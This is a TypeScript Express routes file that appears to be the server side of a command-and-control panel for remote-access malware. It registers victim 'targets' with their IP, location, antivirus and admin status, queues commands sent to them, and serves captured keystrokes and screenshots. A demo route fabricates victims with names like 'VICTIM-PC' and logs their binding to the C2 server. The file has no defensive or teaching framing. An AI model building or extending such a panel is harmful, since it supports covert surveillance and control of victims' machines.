import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertServerConfigSchema, insertTargetSchema, insertLogSchema, insertCommandSchema, generateUniqueCode, AVAILABLE_COMMANDS } from "@shared/schema";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  // Server Config Routes
  app.get("/api/config", async (req, res) => {
    try {
      const config = await storage.getServerConfig();
      res.json(config || null);
    } catch (error) {
      res.status(500).json({ error: "Failed to get config" });
    }
  });

  app.post("/api/config/verify", async (req, res) => {
    try {
      const { port, secretKey, domain } = req.body;
      
      if (!port || !secretKey || !domain) {
        return res.status(400).json({ error: "Missing required fields" });
      }
      
      const portNum = parseInt(port);
      if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
        return res.status(400).json({ error: "Invalid port range (1-65535)" });
      }
      
      if (typeof secretKey !== 'string' || secretKey.length < 8) {
        return res.status(400).json({ error: "Security key must be at least 8 characters" });
      }
      
      if (typeof domain !== 'string' || domain.trim().length === 0) {
        return res.status(400).json({ error: "Domain/IP is required" });
      }
      
      const existingConfig = await storage.getServerConfig();
      
      if (existingConfig) {
        if (existingConfig.port === portNum && existingConfig.secretKey === secretKey) {
          let returnConfig = existingConfig;
          if (existingConfig.domain !== domain) {
            const updated = await storage.updateServerConfig(existingConfig.id, { domain });
            if (updated) {
              returnConfig = updated;
            }
          }
          return res.json({ success: true, config: returnConfig, isNew: false });
        } else {
          return res.status(401).json({ error: "Invalid port or security key" });
        }
      } else {
        const newConfig = await storage.createServerConfig({ port: portNum, secretKey, domain });
        await storage.createLog({ message: `[+] SERVER INITIALIZED ON PORT ${portNum}`, type: "success" });
        await storage.createLog({ message: `[+] DOMAIN SET: ${domain}`, type: "info" });
        await storage.createLog({ message: `[+] LISTENING FOR CONNECTIONS...`, type: "info" });
        return res.json({ success: true, config: newConfig, isNew: true });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to verify config" });
    }
  });

  app.post("/api/config", async (req, res) => {
    try {
      const parsed = insertServerConfigSchema.safeParse(req.body);
      if (!parsed.success) {
        return res.status(400).json({ error: parsed.error.message });
      }
      const config = await storage.createServerConfig(parsed.data);
      await storage.createLog({ message: `[+] SERVER INITIALIZED ON PORT ${parsed.data.port}`, type: "success" });
      await storage.createLog({ message: `[+] DOMAIN SET: ${parsed.data.domain}`, type: "info" });
      await storage.createLog({ message: `[+] LISTENING FOR CONNECTIONS...`, type: "info" });
      res.json(config);
    } catch (error) {
      res.status(500).json({ error: "Failed to create config" });
    }
  });

  app.patch("/api/config/:id", async (req, res) => {
    try {
      const config = await storage.updateServerConfig(req.params.id, req.body);
      res.json(config);
    } catch (error) {
      res.status(500).json({ error: "Failed to update config" });
    }
  });

  // Target Routes
  app.get("/api/targets", async (req, res) => {
    try {
      const targetsList = await storage.getTargets();
      res.json(targetsList);
    } catch (error) {
      res.status(500).json({ error: "Failed to get targets" });
    }
  });

  app.post("/api/targets", async (req, res) => {
    try {
      const parsed = insertTargetSchema.safeParse(req.body);
      if (!parsed.success) {
        return res.status(400).json({ error: parsed.error.message });
      }
      const target = await storage.createTarget(parsed.data);
      await storage.createLog({ 
        message: `[+] NEW CONNECTION: ${parsed.data.ip} (${parsed.data.targetId})`, 
        type: "success" 
      });
      res.json(target);
    } catch (error) {
      res.status(500).json({ error: "Failed to create target" });
    }
  });

  app.patch("/api/targets/:id/status", async (req, res) => {
    try {
      const { status } = req.body;
      const target = await storage.updateTargetStatus(req.params.id, status);
      res.json(target);
    } catch (error) {
      res.status(500).json({ error: "Failed to update target status" });
    }
  });

  app.delete("/api/targets/:id", async (req, res) => {
    try {
      await storage.deleteTarget(req.params.id);
      await storage.createLog({ 
        message: `[-] TARGET REMOVED: ${req.params.id}`, 
        type: "warning" 
      });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete target" });
    }
  });

  // Logs Routes
  app.get("/api/logs", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const logsList = await storage.getLogs(limit);
      res.json(logsList);
    } catch (error) {
      res.status(500).json({ error: "Failed to get logs" });
    }
  });

  app.post("/api/logs", async (req, res) => {
    try {
      const parsed = insertLogSchema.safeParse(req.body);
      if (!parsed.success) {
        return res.status(400).json({ error: parsed.error.message });
      }
      const log = await storage.createLog(parsed.data);
      res.json(log);
    } catch (error) {
      res.status(500).json({ error: "Failed to create log" });
    }
  });

  app.delete("/api/logs", async (req, res) => {
    try {
      await storage.clearLogs();
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to clear logs" });
    }
  });

  // Command Routes
  app.get("/api/commands", async (req, res) => {
    try {
      res.json(AVAILABLE_COMMANDS);
    } catch (error) {
      res.status(500).json({ error: "Failed to get commands" });
    }
  });

  app.get("/api/targets/:targetId/commands", async (req, res) => {
    try {
      const commandsList = await storage.getCommands(req.params.targetId);
      res.json(commandsList);
    } catch (error) {
      res.status(500).json({ error: "Failed to get commands" });
    }
  });

  app.post("/api/targets/:targetId/commands", async (req, res) => {
    try {
      const parsed = insertCommandSchema.safeParse({
        ...req.body,
        targetId: req.params.targetId
      });
      if (!parsed.success) {
        return res.status(400).json({ error: parsed.error.message });
      }
      const command = await storage.createCommand(parsed.data);
      await storage.createLog({ 
        message: `[CMD] ${parsed.data.command} sent to ${req.params.targetId}`, 
        type: "info",
        targetId: req.params.targetId
      });
      res.json(command);
    } catch (error) {
      res.status(500).json({ error: "Failed to create command" });
    }
  });

  app.patch("/api/commands/:id", async (req, res) => {
    try {
      const { status, result } = req.body;
      const command = await storage.updateCommandStatus(req.params.id, status, result);
      res.json(command);
    } catch (error) {
      res.status(500).json({ error: "Failed to update command" });
    }
  });

  // Keystrokes Routes
  app.get("/api/targets/:targetId/keystrokes", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const keystrokesList = await storage.getKeystrokes(req.params.targetId, limit);
      res.json(keystrokesList);
    } catch (error) {
      res.status(500).json({ error: "Failed to get keystrokes" });
    }
  });

  // Screenshots Routes
  app.get("/api/targets/:targetId/screenshots", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 10;
      const screenshotsList = await storage.getScreenshots(req.params.targetId, limit);
      res.json(screenshotsList);
    } catch (error) {
      res.status(500).json({ error: "Failed to get screenshots" });
    }
  });

  // Simulate target connection (for demo purposes)
  app.post("/api/simulate-connection", async (req, res) => {
    try {
      const targetId = `TGT-${Math.floor(Math.random() * 9000) + 1000}`;
      const uniqueCode = generateUniqueCode();
      const names = ["VICTIM-PC", "DESKTOP-WIN", "USER-LAPTOP", "OFFICE-PC", "HOME-PC"];
      const countries = ["US", "UK", "DE", "FR", "RU", "CN", "EG", "SA"];
      const cities = ["New York", "London", "Berlin", "Paris", "Moscow", "Beijing", "Cairo", "Riyadh"];
      const isps = ["Comcast", "Verizon", "AT&T", "Deutsche Telekom", "Rostelecom", "China Telecom", "TE Data", "STC"];
      const platforms = ["windows", "android", "ios", "linux"];
      const osVersions = {
        windows: ["Windows 11 Pro", "Windows 10 Home", "Windows 10 Pro", "Windows 11 Home"],
        android: ["Android 14", "Android 13", "Android 12"],
        ios: ["iOS 17.4", "iOS 17.2", "iOS 16.7"],
        linux: ["Ubuntu 22.04", "Kali Linux 2024", "Debian 12"]
      };
      const cpuModels = ["Intel Core i7-12700K", "AMD Ryzen 7 5800X", "Intel Core i5-11400", "Apple M1", "Snapdragon 8 Gen 3"];
      const gpuModels = ["NVIDIA RTX 4070", "AMD RX 7800 XT", "Intel UHD 770", "Apple M1 GPU", "Adreno 750"];
      const ramSizes = ["8 GB", "16 GB", "32 GB", "64 GB"];
      const resolutions = ["1920x1080", "2560x1440", "3840x2160", "1366x768"];
      const antiviruses = ["Windows Defender", "Kaspersky", "Norton", "Bitdefender", "None"];
      
      const platform = platforms[Math.floor(Math.random() * platforms.length)];
      const countryIndex = Math.floor(Math.random() * countries.length);
      
      const target = await storage.createTarget({
        targetId,
        uniqueCode,
        name: names[Math.floor(Math.random() * names.length)],
        ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        localIp: `192.168.1.${Math.floor(Math.random() * 255)}`,
        externalIp: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        os: osVersions[platform as keyof typeof osVersions][Math.floor(Math.random() * osVersions[platform as keyof typeof osVersions].length)],
        osVersion: "Build 22631",
        platform,
        country: countries[countryIndex],
        city: cities[countryIndex],
        isp: isps[countryIndex],
        status: "online",
        cpuModel: cpuModels[Math.floor(Math.random() * cpuModels.length)],
        ramSize: ramSizes[Math.floor(Math.random() * ramSizes.length)],
        gpuModel: gpuModels[Math.floor(Math.random() * gpuModels.length)],
        screenResolution: resolutions[Math.floor(Math.random() * resolutions.length)],
        antivirusInstalled: antiviruses[Math.floor(Math.random() * antiviruses.length)],
        isAdmin: Math.random() > 0.5,
        username: `user${Math.floor(Math.random() * 1000)}`,
        hostname: names[Math.floor(Math.random() * names.length)]
      });

      await storage.createLog({ 
        message: `[+] NEW CONNECTION RECEIVED: ${target.ip} (${target.externalIp})`, 
        type: "success" 
      });
      await storage.createLog({ 
        message: `[+] UNIQUE CODE: ${target.uniqueCode}`, 
        type: "success" 
      });
      await storage.createLog({ 
        message: `[+] PLATFORM: ${target.platform.toUpperCase()} | ${target.os}`, 
        type: "info" 
      });
      await storage.createLog({ 
        message: `[+] BINDING TARGET (${target.targetId}) TO C2 SERVER...`, 
        type: "info" 
      });

      res.json(target);
    } catch (error) {
      res.status(500).json({ error: "Failed to simulate connection" });
    }
  });

  return httpServer;
}
